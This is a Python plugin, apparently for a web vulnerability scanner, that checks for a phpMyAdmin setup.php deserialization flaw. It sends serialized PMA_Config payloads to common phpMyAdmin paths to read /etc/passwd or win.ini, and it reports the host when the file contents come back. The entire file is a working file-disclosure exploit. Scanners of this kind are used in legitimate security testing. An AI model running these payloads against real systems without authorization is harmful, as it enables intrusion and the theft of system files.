#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB


    async def prove(self):
        if self.base_url:
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url, [
                    './phpMyAdmin/',
                    './pma/',
                    '/phpmyadmin/',
                    './',
                ]):
                    url = path + 'scripts/setup.php'
                    datas = ['action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}',
                             'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:18:"C:\\Windows\\win.ini";}']
                    for data in datas:
                        async with session.post(url=url, headers=headers, data=data, allow_redirects=False) as res:
                            if res:
                                text = await res.text()
                                if 'root:' in text or '[extensions]' in text:
                                    yield url
                                    return
